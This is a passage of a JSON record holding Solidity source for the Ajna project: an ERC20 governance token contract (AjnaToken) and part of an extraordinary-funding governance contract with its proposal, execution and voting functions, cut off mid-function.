      "content": "// SPDX-License-Identifier: MIT\n\n//slither-disable-next-line solc-version\npragma solidity 0.8.7;\n\nimport { ERC20 }         from \"@oz/token/ERC20/ERC20.sol\";\nimport { ERC20Burnable } from \"@oz/token/ERC20/extensions/ERC20Burnable.sol\";\nimport { ERC20Permit }   from \"@oz/token/ERC20/extensions/draft-ERC20Permit.sol\";\nimport { ERC20Votes }    from \"@oz/token/ERC20/extensions/ERC20Votes.sol\";\n\ncontract AjnaToken is ERC20, ERC20Burnable, ERC20Permit, ERC20Votes {\n    constructor(address tokenReceiver_) ERC20(\"AjnaToken\", \"AJNA\") ERC20Permit(\"AjnaToken\") {\n        _mint(tokenReceiver_, 2_000_000_000 * 10 ** decimals());\n    }\n\n    /*****************/\n    /*** Overrides ***/\n    /*****************/\n\n    function _afterTokenTransfer(address from_, address to_, uint256 amount_) internal override(ERC20, ERC20Votes) {\n        super._afterTokenTransfer(from_, to_, amount_);\n    }\n\n    /**\n     *  @notice Ensure tokens cannot be transferred to token contract\n     */\n    function _beforeTokenTransfer(address, address to_, uint256) internal view override {\n        require(to_ != address(this), \"Cannot transfer tokens to the contract itself\");\n    }\n\n    function _burn(address account_, uint256 amount_) internal override(ERC20, ERC20Votes) {\n        super._burn(account_, amount_);\n    }\n\n    function _mint(address to_, uint256 amount_) internal override(ERC20, ERC20Votes) {\n        super._mint(to_, amount_);\n    }\n\n    /**************************/\n    /*** External Functions ***/\n    /**************************/\n\n\n    /**\n     *  @notice Called by an owner of AJNA tokens to enable their tokens to be transferred by a spender address without making a seperate permit call\n     *  @param  from_     The address of the current owner of the tokens\n     *  @param  to_       The address of the new owner of the tokens\n     *  @param  spender_  The address of the third party who will execute the transaction involving an owners tokens\n     *  @param  value_    The amount of tokens to transfer\n     *  @param  deadline_ The unix timestamp by which the permit must be called\n     *  @param  v_        Component of secp256k1 signature\n     *  @param  r_        Component of secp256k1 signature\n     *  @param  s_        Component of secp256k1 signature\n     */\n    function transferFromWithPermit(\n        address from_, address to_, address spender_, uint256 value_, uint256 deadline_, uint8 v_, bytes32 r_, bytes32 s_\n    ) external {\n        permit(from_, spender_, value_, deadline_, v_, r_, s_);\n        transferFrom(from_, to_, value_);\n    }\n}"
    },
    {
      "filename": "ajna-grants/src/grants/base/ExtraordinaryFunding.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity 0.8.16;\n\nimport { IERC20 }   from \"@oz/token/ERC20/IERC20.sol\";\nimport { SafeCast } from \"@oz/utils/math/SafeCast.sol\";\n\nimport { Funding } from \"./Funding.sol\";\n\nimport { IExtraordinaryFunding } from \"../interfaces/IExtraordinaryFunding.sol\";\n\nimport { Maths } from \"../libraries/Maths.sol\";\n\nabstract contract ExtraordinaryFunding is Funding, IExtraordinaryFunding {\n\n    /*****************/\n    /*** Constants ***/\n    /*****************/\n\n    /**\n     * @notice The maximum length of a proposal's voting period, in blocks.\n     */\n    uint256 internal constant MAX_EFM_PROPOSAL_LENGTH = 216_000; // number of blocks in one month\n\n    /**\n     * @notice Keccak hash of a prefix string for extraordinary funding mechanism\n     */\n    bytes32 internal constant DESCRIPTION_PREFIX_HASH_EXTRAORDINARY = keccak256(bytes(\"Extraordinary Funding: \"));\n\n    /***********************/\n    /*** State Variables ***/\n    /***********************/\n\n    /**\n     * @notice Mapping of extant extraordinary funding proposals.\n     * @dev proposalId => ExtraordinaryFundingProposal.\n     */\n    mapping (uint256 => ExtraordinaryFundingProposal) internal _extraordinaryFundingProposals;\n\n    /**\n     * @notice The list of extraordinary funding proposalIds that have been executed.\n     */\n    uint256[] internal _fundedExtraordinaryProposals;\n\n    /**\n     * @notice Mapping checking if a voter has voted on a given proposal.\n     * @dev proposalId => address => bool.\n     */\n    mapping(uint256 => mapping(address => bool)) public hasVotedExtraordinary;\n\n    /**************************/\n    /*** Proposal Functions ***/\n    /**************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function executeExtraordinary(\n        address[] memory targets_,\n        uint256[] memory values_,\n        bytes[] memory calldatas_,\n        bytes32 descriptionHash_\n    ) external nonReentrant override returns (uint256 proposalId_) {\n        proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));\n\n        ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId_];\n\n        // since we are casting from uint128 to uint256, we can safely assume that the value will not overflow\n        uint256 tokensRequested = uint256(proposal.tokensRequested);\n\n        // check proposal is succesful and hasn't already been executed\n        if (proposal.executed || !_extraordinaryProposalSucceeded(proposalId_, tokensRequested)) revert ExecuteExtraordinaryProposalInvalid();\n\n        _fundedExtraordinaryProposals.push(proposalId_);\n\n        // update proposal state\n        proposal.executed = true;\n\n        // update treasury\n        treasury -= tokensRequested;\n\n        // execute proposal's calldata\n        _execute(proposalId_, targets_, values_, calldatas_);\n    }\n\n    /// @inheritdoc IExtraordinaryFunding\n    function proposeExtraordinary(\n        uint256 endBlock_,\n        address[] memory targets_,\n        uint256[] memory values_,\n        bytes[] memory calldatas_,\n        string memory description_) external override returns (uint256 proposalId_) {\n\n        proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));\n\n        ExtraordinaryFundingProposal storage newProposal = _extraordinaryFundingProposals[proposalId_];\n\n        // check if proposal already exists (proposal id not 0)\n        if (newProposal.proposalId != 0) revert ProposalAlreadyExists();\n\n        // check proposal length is within limits of 1 month maximum\n        if (block.number + MAX_EFM_PROPOSAL_LENGTH < endBlock_) revert InvalidProposal();\n\n        uint128 totalTokensRequested = _validateCallDatas(targets_, values_, calldatas_);\n\n        // check tokens requested are available for claiming from the treasury\n        if (uint256(totalTokensRequested) > _getSliceOfTreasury(Maths.WAD - _getMinimumThresholdPercentage())) revert InvalidProposal();\n\n        // store newly created proposal\n        newProposal.proposalId      = proposalId_;\n        newProposal.startBlock      = SafeCast.toUint128(block.number);\n        newProposal.endBlock        = SafeCast.toUint128(endBlock_);\n        newProposal.tokensRequested = totalTokensRequested;\n\n        emit ProposalCreated(\n            proposalId_,\n            msg.sender,\n            targets_,\n            values_,\n            new string[](targets_.length),\n            calldatas_,\n            block.number,\n            endBlock_,\n            description_\n        );\n    }\n\n    /************************/\n    /*** Voting Functions ***/\n    /************************/\n\n    /// @inheritdoc IExtraordinaryFunding\n    function voteExtraordinary(\n        uint256 proposalId_\n    ) external override returns (uint256 votesCast_) {\n        // revert if msg.sender already voted on proposal\n        if (hasVotedExtraordinary[proposalId_][msg.sender]) revert AlreadyVoted();\n\n        ExtraordinaryFundingProposal storage proposal = _extraordinaryFundingProposals[proposalId"
    }
  ]
}